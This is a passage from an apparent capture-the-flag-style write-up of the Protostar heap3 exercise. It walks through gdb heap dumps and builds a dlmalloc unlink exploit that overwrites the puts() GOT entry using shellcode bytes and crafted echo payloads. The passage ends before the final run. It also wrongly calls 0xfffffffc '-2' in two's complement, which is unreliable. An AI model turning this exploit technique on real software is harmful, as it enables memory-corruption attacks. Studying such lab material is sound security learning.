</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048750</span> <span class="n">in</span> <span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see the 12 <code>B</code>&rsquo;s and <code>C</code>&rsquo;s being written to their respective chunks. We are now at the first
<code>free()</code>. Continue again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c030</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first word of the third chunk&rsquo;s data at <code>0x804c058</code> has been zeroed out. Continue.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x0804c050</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c008</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>0x804c030</code> now has <code>0x0804c050</code> which is a pointer to the start of the third chunk. This shows the
second and third chunk are now tied together in a singly-linked list since they are small enough to
be considered fastbins. Continue.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x0804c050</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x08048790</span> <span class="n">in</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now the first chunk has been freed and address <code>0x804c008</code> has a pointer <code>0x0804c028</code> to the second
chunk. If we continue, the program runs the <code>printf("dynamite failed?\n");</code> line.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="n">dynamite</span> <span class="n">failed</span><span class="o">?</span>
</span><span class='line'>
</span><span class='line'><span class="n">Program</span> <span class="n">exited</span> <span class="n">with</span> <span class="n">code</span> <span class="mf">021.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="n">Error</span> <span class="k">while</span> <span class="n">running</span> <span class="nl">hook_stop</span><span class="p">:</span>
</span><span class='line'><span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x804c000</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Crafting the exploit</h2>

<p>Let&rsquo;s work backwards. We can use <code>unlink()</code> to write the four byte address of a call to <code>winner()</code> to the GOT
entry for <code>puts()</code>. Use <code>objdump</code> to find the address of <code>winner()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">t</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">winner</span>
</span><span class='line'><span class="mi">08048864</span> <span class="n">g</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>    <span class="mo">00000025</span>              <span class="n">winner</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can&rsquo;t just put <code>0x08048864</code> in the GOT entry at <code>0x804b128</code> (why?).
In order to call <code>winner()</code>, we&rsquo;ll need to craft a payload that does so. Such a
payload is often called &ldquo;<a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>.&rdquo; The following assembly code will do.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x8048864</span>
</span><span class='line'><span class="n">call</span> <span class="n">eax</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using an <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">online x86 assembler</a>, the above in raw assembly is
<code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. We can store this in the heap&rsquo;s first chunk whose data area starts
at <code>0x804c008</code>. Now we want to write <code>0x804c008</code> into the GOT entry for <code>puts()</code> at <code>0x804b128</code>.
Let&rsquo;s go back to the unlink statements.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BK</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
</span><span class='line'><span class="n">FD</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>BK</code> is the address of <code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. Where should we store that? Let&rsquo;s put it in
the first chunk at <code>0x804c014</code>. The first chunk&rsquo;s data starts at <code>0x804c008</code>, but we&rsquo;ve seen the
first byte is changed by dlmalloc when it&rsquo;s freed. We don&rsquo;t want our shellcode to be changed so we
put it at a safe distance in the data at a +12-byte offset. 12 <code>A</code>&rsquo;s can pad the shellcode enough to
push it 12-bytes into the heap. We have enough info to construct the first command line argument.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;AAAAAAAAAAAA</span><span class="se">\xB8\x64\x88\x04\x08\xFF\xD0</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ll store <code>FD</code> and <code>BK</code> in the third chunk. We can use the second command line argument to
overwrite the size of the third chunk to be greater than 80 to trigger the <code>unlink()</code> macro when the
third chunk is <code>free()</code>&rsquo;d. The second argument needs to have enough characters to overflow its
chunk. The chunk&rsquo;s data starts at <code>0x804c030</code> and ends 32 bytes later at <code>0x804c050</code>. The third
chunk&rsquo;s <code>size</code> is four bytes later at <code>0x804c054</code>. So we can use 32 + 4 = 36 characters as padding.
Let&rsquo;s pick 100 as the size of the third chunk. 100 = 0x64. We also have to set the last bit to 1 to
indicate the second or previous chunk is in use. So the third chunk&rsquo;s size should be <code>0x65</code>. So our
second argument can have 36 <code>B</code>&rsquo;s as padding followed by <code>\x65</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><span class="se">\x65</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we craft the third and final argument. The structure for it will be some padding + some four
bytes to be determined + some size + <code>FD</code> + <code>BK</code>.</p>

<p>The third chunk starts at <code>0x804c050</code>. It used to end 40 bytes later at <code>0x804c078</code>, but we
overwrote its size to <code>0x65</code> or 100. So now it ends 100 bytes later at <code>0x804c0b4</code>. We want to
trigger <code>unlink()</code> on the third chunk when we <code>free()</code> it. We&rsquo;ve already ensured it&rsquo;s not a fastbin
by setting its size to be greater than 80 bytes. The next condition is to make dlmalloc consolidate
this chunk with either the chunk before or after. Since we&rsquo;re using the previous chunk, let&rsquo;s fool
dlmalloc into thinking the next chunk is free.</p>

<p>I know what you&rsquo;re thinking. There&rsquo;s no fourth chunk. That&rsquo;s right, but we&rsquo;ll make dlmalloc think
there is. In order to check a chunk is free, dlmalloc looks at the <code>PREV_INUSE</code> bit of the next
chunk. To find the next chunk, dlmalloc adds the size of the current chunk to the current chunk&rsquo;s
address. You can see this at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L3259">line 3259</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">)))</span>   <span class="cm">/* consolidate forward */</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>inuse_bit_at_offset()</code> is a macro defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1410-L1411">line 1410</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define inuse_bit_at_offset(p, s) \</span>
</span><span class='line'><span class="cp">  (chunk_at_offset((p), (s))-&gt;size &amp; PREV_INUSE)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>chunk_at_offset()</code> is defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1381">line 1381</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define chunk_at_offset(p, s)  BOUNDED_1((mchunkptr)(((char*)(p)) + (s)))</span>
</span></code></pre></td></tr></table></div></figure>


<p>So let&rsquo;s write a small size at <code>0x804c0b8</code> to make dlmalloc think the fifth chunk is close by and so
we don&rsquo;t have to add too much padding to our third argument. A size like <code>0x20</code>. We&rsquo;ll have to write
it as <code>\x00\x00\x00\x20</code>. But we have a problem here. C treats <code>\x00</code> as the end of a string, and
thus <code>strcpy()</code> will stop copying any string up to and including that <code>NUL</code>. We won&rsquo;t be able to add
any more bytes after that. This means we cannot insert <code>\x00</code> in the middle of any of our inputs.</p>

<p>But all is not lost. We want a small number for the fourth chunk&rsquo;s size. What&rsquo;s another way of
summing to a small number, at least in the way computers represent integers? In non-modular
arithmetic, the only way two integers can produce a small sum is if they themselves are smaller. In
modular arithmetic, a small integer can be the sum of large numbers that are greater than the
modulus.</p>

<p>Take a closer look at how <code>chunk_at_offset()</code> is defined. It sums two numbers with no sanity checks.
So we can write a really big number with no null bytes that <code>strcpy()</code> won&rsquo;t stop on and will make
dlmalloc think the next fifth chunk is close by. Even better, we can use the first byte of the
fourth chunk as the fifth chunk&rsquo;s size. How can we make dlmalloc think the fifth chunk is four bytes
ahead of the fourth chunk? We do this with <code>0xfffffffc</code> which is -2 in two&rsquo;s complement for signed
integers. So <code>0xfffffffc</code> at <code>0x804c0b8</code> will point to a fifth chunk&rsquo;s size four bytes earlier at
<code>0x804c0b4</code>. This word&rsquo;s last bit must be set to 0 to indicate the fourth chunk is free. We can
simply use <code>0xfffffffc</code> again here.</p>

<p>We want <code>(FD + 12)</code> to equal <code>0x804b128</code>. So FD should be <code>0x804b128</code> - 12 = <code>0x804b11c</code>. In the above
we decided to make <code>BK</code> <code>0x0804c014</code>. We have</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><span class="se">\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span>
</span></code></pre></td></tr></table></div></figure>


<p>92 <code>C</code>&rsquo;s of padding, two <code>0xfffffffc</code> words, <code>FD</code>, followed by <code>BK</code>.</p>

<h2>Checking it works</h2>

<p>With the same gdb session as above, run the program with the three arguments.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
